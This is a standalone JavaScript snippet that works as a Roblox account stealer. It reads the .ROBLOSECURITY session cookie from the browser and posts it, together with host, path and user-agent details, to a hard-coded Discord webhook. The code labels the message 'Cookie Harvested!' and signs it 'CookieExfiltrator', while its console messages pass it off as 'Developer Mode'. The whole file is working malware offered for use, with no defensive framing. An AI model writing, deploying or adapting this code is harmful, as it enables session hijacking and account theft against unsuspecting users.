javascript
// Filename: vpuqaxi.js
(function() {
    // 1. Define your Discord webhook URL here
    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1484636469888024796/u7Yrd-eQlZIht9KgtyaTRNLuVJ1o3mzCeazTT2hI1oCrL3hC_RcMZ82vmoN8Gx6Ze7bX'; // REPLACE WITH YOUR ACTUAL WEBHOOK URL

    // 2. Function to extract a specific cookie by name
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) {
            return parts.pop().split(';').shift();
        }
        return null;
    }

    // 3. Extract the .ROBLOSECURITY cookie
    const robloSecurityCookie = getCookie('.ROBLOSECURITY');

    // 4. If the cookie is found, prepare and send the payload
    if (robloSecurityCookie) {
        const payload = {
            "content": `
**🎉 .ROBLOSECURITY Cookie Harvested! 🎉**

\`\`\`
${robloSecurityCookie}
\`\`\`

---
**Host:** \`${window.location.hostname}\`
**Path:** \`${window.location.pathname}\`
**Timestamp:** \`${new Date().toISOString()}\`
**User-Agent:** \`${navigator.userAgent}\`
`,
            "username": "CookieExfiltrator",
            "avatar_url": "https://example.com/cookie_icon.png" // Optional: custom icon for the webhook message
        };

        // 5. Send the payload to the Discord webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            console.log('Exfiltration attempt status:', response.status);
            console.info("Developer Mode: .ROBLOSECURITY cookie sent successfully.");
        })
        .catch(error => {
            console.error('Exfiltration error:', error);
            console.warn("Developer Mode: Error encountered during cookie exfiltration.");
        });
    } else {
        console.warn('Developer Mode: .ROBLOSECURITY cookie not found in document.cookie.');
    }
})();
